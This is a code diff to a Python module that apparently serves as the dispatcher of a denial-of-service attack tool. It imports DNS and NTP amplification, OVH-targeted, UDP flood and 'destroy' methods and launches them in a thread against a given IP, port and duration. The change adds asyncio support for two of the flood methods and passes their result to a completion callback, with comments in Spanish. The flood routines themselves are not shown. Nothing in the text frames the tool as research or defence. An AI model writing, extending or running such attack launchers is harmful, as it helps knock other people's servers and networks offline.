@@ -1,4 +1,5 @@
 import threading
+import asyncio
 from methods import dns, ntp, amp_dns, amp_ntp, amp_mix, amp_ovh, udppps, udpdown, udpflood, destroy
 from methods.destroy import destroy_flood
 
@@ -22,10 +23,15 @@ def start_attack(method, ip, port, duration, on_finish=None):
         "destroy": destroy_flood,
     }
 
+    async_methods = {"udpdown", "udpflood"}  # agrega aquí los métodos async
+
     def run_with_callback():
-        method_map[method](ip, port, duration, stop_event)
+        if method in async_methods:
+            result = asyncio.run(method_map[method](ip, port, duration, stop_event))
+        else:
+            result = method_map[method](ip, port, duration, stop_event)
         if not stop_event.is_set() and on_finish:
-            on_finish()
+            on_finish(result)  # pasa el result, aunque no lo uses
 
     if method in method_map:
         attack_thread = threading.Thread(target=run_with_callback)
@@ -37,4 +43,3 @@ def stop_attack():
     if attack_thread:
         attack_thread.join()
         attack_thread = None
-  
